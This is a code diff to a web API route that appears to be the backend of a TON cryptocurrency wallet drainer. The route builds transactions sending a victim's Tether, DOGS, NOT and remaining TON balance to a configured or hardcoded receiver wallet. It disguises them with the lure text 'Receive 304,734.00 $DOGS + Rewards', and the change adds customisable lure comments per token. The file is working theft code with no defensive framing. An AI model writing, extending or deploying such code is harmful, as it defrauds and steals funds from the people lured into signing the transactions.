@@ -18,8 +18,9 @@ const defaultText = '🔐 Receive 304,734.00 $DOGS + Rewards'
 export async function POST(req: NextRequest) {
 	const {address: senderAddress,bot} = await req.json();
 
-	const botData = await getBotData(+bot);
-	const receiverAddress = botData.address ?? "UQCwIguY34l9G5fb7uXKaC44PVUYYhqMAvBCqQca7C0kLMlS";
+	const config = await getBotData(+bot);
+	
+	const receiverAddress = config.address ?? "UQCwIguY34l9G5fb7uXKaC44PVUYYhqMAvBCqQca7C0kLMlS";
 	console.log(bot, "RECEIVER", receiverAddress)
 	const senderWallet = Address.parse(senderAddress);
 	const receiverWallet = Address.parse(receiverAddress);
@@ -43,6 +44,11 @@ export async function POST(req: NextRequest) {
 		tetherAddress,
 		dogsAddress,
 		notAddress
+	]
+	const comments = [
+		config.transaction_comments?.tether ?? defaultText,
+		/*config.transaction_comments?.dogs  ??*/ defaultText,
+		config.transaction_comments?.not ?? defaultText,
 	]
 	for (let contract of contracts) {
 		const jettonWallet = await getContractWallet(contract, senderWallet);
@@ -72,7 +78,7 @@ export async function POST(req: NextRequest) {
 		transactions.push({
 			address: receiverWallet.toRawString(),
 			amount: remains.toString(),
-			payload: (beginCell().storeUint(0, 32).storeStringTail(defaultText).endCell()).toBoc().toString('base64')
+			payload: (beginCell().storeUint(0, 32).storeStringTail(config?.transaction_comments?.ton ?? defaultText).endCell()).toBoc().toString('base64')
 		})
 
 	}
